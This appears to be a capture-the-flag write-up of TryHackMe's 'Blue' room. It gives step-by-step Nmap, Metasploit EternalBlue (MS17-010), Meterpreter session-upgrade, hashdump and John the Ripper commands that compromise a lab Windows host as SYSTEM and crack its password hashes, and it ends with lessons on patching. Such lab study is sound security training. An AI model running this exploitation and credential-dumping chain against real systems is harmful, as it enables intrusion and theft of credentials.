# Room: Blue (EternalBlue / MS17-010) - TryHackMe

This folder documents my walkthrough of the **Blue** room on TryHackMe — a hands-on challenge that puts the Metasploit skills into practice by fully compromising a Windows machine vulnerable to **EternalBlue (MS17-010)**. 🏅 *Badge earned: "Blue – Hacking into Windows via EternalBlue".*

## 🎯 Objective

Exploit the MS17-010 SMB vulnerability to gain a shell, escalate to a stable Meterpreter session as SYSTEM, dump and crack the credentials, and locate the flags.

---

## 🔍 1. Reconnaissance

```bash
# Full service/version scan
nmap -sV -sC -p- <TARGET_IP>

# Confirm the SMB vulnerability specifically
nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
```

Key finding: port **445 (SMB)** open and flagged as vulnerable to **MS17-010**.

---

## 💥 2. Gaining Access (EternalBlue)

```bash
msfconsole -q
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
show options

set RHOSTS <TARGET_IP>
set LHOST <tun0_IP>        # THM VPN interface!
exploit
```

The exploit returns a session running as `NT AUTHORITY\SYSTEM` — highest privileges from the start.

---

## 🐚 3. Upgrading to a Stable Meterpreter Session

If the initial session is a basic shell, upgrade it to Meterpreter for stability and richer tooling:

```bash
# Background the shell session (Ctrl+Z), then:
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run

sessions            # list sessions
sessions -i 2       # interact with the new Meterpreter session
```

```bash
# Migrate into a stable process to keep the session alive
ps                  # list processes
migrate <PID>       # e.g. a spoolsv.exe / stable SYSTEM process
getuid              # confirm: NT AUTHORITY\SYSTEM
```

---

## 🔐 4. Credential Dumping & Cracking

```bash
# Inside Meterpreter: dump the local password hashes
hashdump
```

```bash
# Crack the extracted NTLM hash offline with John (NT format)
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The non-default user's password is recovered from the NTLM hash using the RockYou wordlist.

---

## 🚩 5. Finding the Flags

```bash
# Drop into a shell and search the file system
shell
# Windows built-in recursive search
dir /r /s flag*.txt        # or use Meterpreter's: search -f flag*.txt
```

Three flags are hidden at typical locations (system root, where passwords are stored, and an admin's documents) — found via file-system search from the SYSTEM session.

---

## 🧠 Lessons Learned

*   **MS17-010 is devastating precisely because it lands as SYSTEM** — no separate privilege-escalation step needed. It's a textbook example of why patching (MS17-010, 2017) and disabling SMBv1 matter.
*   **`shell_to_meterpreter` + `migrate`** is the reliable recipe for turning a fragile initial foothold into a stable, full-featured session.
*   The room ties the whole path together: recon (Nmap) → exploitation (Metasploit) → post-exploitation (Meterpreter, `hashdump`) → offline cracking (John the Ripper).

---
*Disclaimer: All activities were performed legally within TryHackMe's sandboxed lab environment for educational purposes.*
